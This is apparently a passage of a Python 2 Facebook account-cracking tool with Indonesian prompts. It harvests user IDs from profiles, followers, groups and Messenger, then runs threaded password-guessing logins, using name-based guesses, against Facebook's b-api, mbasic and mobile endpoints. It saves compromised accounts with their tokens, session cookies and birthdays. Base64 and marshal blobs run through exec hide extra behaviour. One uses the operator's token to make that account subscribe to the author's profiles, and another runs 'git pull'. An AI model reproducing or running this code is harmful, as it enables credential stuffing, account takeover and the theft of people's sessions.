1pQWZyaXphbD4lc1xuIiUocGssbmFtZSkpCgkJCQllbHNlOgoJCQkJCWQ9YnM0LnJlLmZpbmRhbGwoIi8oLio/KVw/IixnKQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikKCQkJCQlpZiBsZW4oZCkgIT0wOgoJCQkJCQlwaz0iIi5qb2luKGQpCgkJCQkJCWlmIHBrIGluIG9wZW4oZmwpLnJlYWQoKToKCQkJCQkJCXBhc3MKCQkJCQkJZWxzZToKCQkJCQkJCW9wZW4oZmwsImErIikud3JpdGUoIiVzPD0+JXNcbiIlKHBrLG5hbWUpKQoJCWlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gaS50ZXh0OgoJCQluYW1haChmbCxyLGlbImhyZWYiXSkKCWV4aXQoIlxuXHgxYlsxOzkybeKAoiBmaW5pc2hlZC4iKQoJCQkJ'))

exec(base64.b64decode('Y2xhc3MgZHVtcF9tZXNzYWdlOgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKToKICAgICAgICBzZWxmLmNvb2tpZXMgPSBjb29raWVzCiAgICAgICAgI2Jhc2Vjb29raWUoKQogICAgICAgICNjbGVhcigpCiAgICAgICAgc2VsZi5mID0gcmF3X2lucHV0KCdcbiVzJXMlcyAgTmFtYSBmaWxlJXMgPiVzICclVSx0aWwsTyxNLEspLnJlcGxhY2UoJyAnLCAnXycpCiAgICAgICAgaWYgc2VsZi5mID09ICcnOgogICAgICAgICAgICBkdW1wX21lc3NhZ2UoY29va2llcykKICAgICAgICBvcGVuKHNlbGYuZiwgJ3cnKS5jbG9zZSgpCiAgICAgICAgc2VsZi5kdW1wKCdodHRwczovL20uZmFjZWJvb2suY29tL21lc3NhZ2VzJykKCiAgICBkZWYgZHVtcChzZWxmLCB1cmwpOgogICAgICAgIGJzID0gYnM0LkJlYXV0aWZ1bFNvdXAocmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZGNvaygpLCBjb29raWVzPXNlbGYuY29va2llcykudGV4dCwgJ2h0bWwucGFyc2VyJykKICAgICAgICBmb3IgaSBpbiBicy5maW5kX2FsbCgnYScsIGhyZWY9VHJ1ZSk6CiAgICAgICAgICAgIGlmICcvbWVzc2FnZXMvcmVhZCcgaW4gaS5nZXQoJ2hyZWYnKToKICAgICAgICAgICAgICAgIGYgPSBiczQucmUuZmluZGFsbCgnY2lkXFwuY1xcLiguKj8pJTNBKC4qPykmJywgaS5nZXQoJ2hyZWYnKSkKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBmb3IgaXAgaW4gbGlzdChmLnBvcCgpKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5jb29raWVzLmdldCgnIGNfdXNlcicpIGluIGlwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdwZW5nZ3VuYSBmYWNlYm9vaycgaW4gaS50ZXh0Lmxvd2VyKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oc2VsZi5mLCAnYSsnKS53cml0ZSgnJXM8Um9taUFmcml6YWw+JXNcbicgJSAoaXAsIGkudGV4dCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHIlcyVzJXMgU2VkYW5nIGR1bXAgaWQgJXM+ICVzJXMlcyAtICVzQ1RSTCtaIGZvciBzdG9wJyAlVSx0aWwsTyxNLGxlbihvcGVuKHNlbGYuZikucmVhZCgpLnNwbGl0bGluZXMoKSksUCxPLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgaWYgJ0xpaGF0IFBlc2FuIFNlYmVsdW1ueWEnIGluIGkudGV4dDoKICAgICAgICAgICAgICAgIHNlbGYuZHVtcCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8nICsgaS5nZXQoJ2hyZWYnKSkKICAgICAgICBleGl0KCdcblx4MWJbMTs5Mm3igKIgc3VjY2VzcyAlcyBpZCBzYXZlZCB0byA6ICVzJyAlIChsZW4ob3BlbihzZWxmLmYpLnJlYWQoKS5zcGxpdGxpbmVzKCkpLCBzZWxmLmYpKQ=='))

# GANTI USER AGENT
def useragent():
	print ("\n%s%s%s 01 %sGanti user agents "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agents "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	uas()
	
def uas():
    u = raw_input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
    if u == '':
        print '%s%s wrong input'%(M,til);jeda(2);uas()
    elif u in("1","01"):
    	print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
    	print ("%s%s%s Ketik %sdefault%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
    	try:
    	    ua = raw_input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
            if ua in(""):
            	print ("%s%s isi yang benar "%(M,til));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
            	ua_ = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')
                open("data/ua.txt","w").write(ua_)
                print ("\n%s%s Using the built-in user agent"%(H,til));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s%s Successfully changed user agent"%(H,til));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m• Error ") 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s user agent anda : %s%s"%(U,til,O,H,ua_));jeda(2);raw_input("%s%s%s kembali "%(U,til,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print '%s%s wrong input'%(M,til);jeda(2);uas()

class ngentod:

    def __init__(self):
        self.id = []

    def askk(self):
        try:
            self.apk = raw_input('\n%s%s%s file dump %s> %s'%(U,til,O,M,K))
            self.id = open(self.apk).read().splitlines()
            print '%s%s%s jumlah Id%s > %s%s' %(U,til,O,M,H,len(self.id))
        except:
            print '\n%s%s file dump :%s tidak ada '%(M,til,self.apk);jeda(3);menu()
        rom = raw_input('%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
        if rom in ('Y', 'y'):
            print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
            while True:
                pwek = raw_input('%s%s%s password %s> %s'%(U,til,O,M,K))
                if pwek == '':
                    print("%s%s Jangan kosong"%(M,til))
                elif len(pwek)<=5:
                    print ('%s%s sandi minimal 6 karakter'%(M,til))
                else:
                    def xxh(xxnx=None):
                        skm = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
                        if skm in(""):
                            print '%s%s isi yg benar sayang'%(M,til);self.xxh()
                        elif skm in("1","01"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.api, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("2","02"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mbasic, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("3","03"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mobile, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        else:
                            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
                    print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
                    print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
                    print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
                    print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
                    xxh(pwek.split(','))
                    break
        elif rom in ('T', 't'):
            print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
            print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
            print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
            print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
            self.sung()
        else:
            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
        return

    def api(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            send = requests.get(api, params=params, headers=headers_)
            if send.status_code != 200:
            	print "\r\033[0;91m• IP anda terblokir. hidupkan mode pesawat 2 detik",
                sys.stdout.flush()
                loop +=1
                api(self, user, xxh)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print ('\r %s*--> %s ◊ %s ◊ %s   ' % (H,user,pw,send.json()['access_token']))
                wrt = ' *--> %s ◊ %s ◊ %s ' % (user,pw,send.json()['access_token'])
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in send.json()['error_msg']:
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r  %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mbasic(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki))
                wrt = (' *--> %s ◊ %s ◊ %s' % (user,pw,kuki))
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print ('\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year))
                    wrt = (' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year))
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print ('\r %s*--> %s ◊ %s           ' % (K,user,pw))
                wrt = (' *--> %s ◊ %s' % (user,pw))
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mobile(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                wrt = ' *--> %s ◊ %s ◊ %s' % (user,pw,kuki)
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def sung(self):
        ii = raw_input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
        if ii == '':
            print '\n%s%s isi yang benar '%(M,til);self.askk()
        elif ii in ('1', '01'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('2', '02'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mbasic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('3', '03'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mobile, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        else:
            print '\n%s%s isi yang benar'%(M,til);self.askk()
            
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('data/token.txt', 'r').read()
    except IOError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    except requests.exceptions.ConnectionError:
        exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
    banner()
    print ('%s # %sName %s: %s%s%s \n'%(U,O,M,H,nama,O))
    print ('%s%s%s 01 %sDump id public'%(U,til,P,O))
    print ('%s%s%s 02 %sDump id followers'%(U,til,P,O))
    print ('%s%s%s 03 %sDump id reaction post'%(U,til,P,O))
    print ('%s%s%s 04 %sDump id member groups'%(U,til,P,O))
    print ('%s%s%s 05 %sDump id pencarian nama'%(U,til,P,O))
    print ('%s%s%s 06 %sDump id pesan mesengger'%(U,til,P,O))
    print ('%s%s%s 07 %sMulai crack'%(U,til,H,O))
    print ('%s%s%s 08 %sGanti user agent'%(U,til,P,O))
    print ('%s%s%s 09 %sCek hasil crack'%(U,til,P,O))
    #print ('%s%s%s 10 %sInfo script'%(U,til,P,O))
    print ('%s%s%s rm %sHapus token'%(U,til,P,O))
    print ('%s%s%s 00 %sKeluar'%(U,til,M,O))
    slut = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
    if slut == '':
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
    elif slut in['1','01']:
        publik(romz)
    elif slut in['2','02']:
        followers(romz)
    elif slut in['3','03']:
        postingan(romz)
    elif slut in['4','04']:
        dump_grup(basecookie())
    elif slut in['5','05']:
    	dumpfl()
        exit()
    elif slut in['6','06']:
    	dump_message(basecookie())
    elif slut in['7','07']:
        ngentod().askk()
    elif slut in['8','08']:
    	useragent()
    elif slut in['9','09']:
        try:
            dirs = os.listdir("hasil")
            print '\n%s%s%s [ hasil crack yang tersimpan ]\n'%(U,til,O,);jeda(0.2)
            for file in dirs:
                print("%s%s%s> %s%s"%(U,til,M,O,file));jeda(0.2)
            file = raw_input("\n%s%s%s masukan nama file %s:%s "%(U,til,O,M,O));jeda(0.2)
            if file == "":
                file = raw_input("\n%s%s%s masukan nama file :%s "%(U,til,O,H));jeda(0.2)
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            ttl_file  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan("%s%s%s Crack tanggal %s:%s%s %stotal %s: %s%s"%(U,til,O,M,P,ttl_file,O,M,P,len(total)))
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
        except (IOError):
            print("\n%s%s tidak ada hasil :("%(M,til))
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
    elif slut in['10']:
        print(ingfo)
    elif slut in['rm','Rm','RM']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt')
        jalan('\n%s%s berhasil menghapus token'%(H,til));exit()
    elif slut in['0','00']:
    	exit()
    else:
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()

exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6DQogICAgdHJ5Og0KICAgICAgICB0b2tlbiA9IG9wZW4oImRhdGEvdG9rZW4udHh0IiwiciIpLnJlYWQoKQ0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMjIwODYxNzI1NTYvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEZhbnNwYWdlIFJvbWkgWEQNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwNCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDY3ODA3NTY1ODYxL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwgKDIwMjEpDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzcyMzY5Njg4NS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSXFiYWwgYm9ieg0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaA0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDc1MjAyMDM0NTIvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhhbXphaCBraXJhbmENCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAyNDYxMzQ0MTc4L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBVbmlrIFJPTUkgQUZSSVpBTA0KICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55DQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAyOTE0MzExMTU2Ny9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgRGVtaXQgUm9taSBBZnJpemFsDQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMTU0MDI5OTEwOC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFraWtpDQogICAgZXhjZXB0Og0KICAgIAlwYXNz'))

exec(marshal.loads("c\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s'\x00\x00\x00e\x00\x00d\x00\x00k\x02\x00r#\x00e\x01\x00j\x02\x00d\x01\x00\x83\x01\x00\x01e\x03\x00\x83\x00\x00\x01n\x00\x00d\x02\x00S(\x03\x00\x00\x00t\x08\x00\x00\x00__main__s\x08\x00\x00\x00git pullN(\x04\x00\x00\x00t\x08\x00\x00\x00__name__t\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x04\x00\x00\x00menu(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x0c\x01\r\x01"))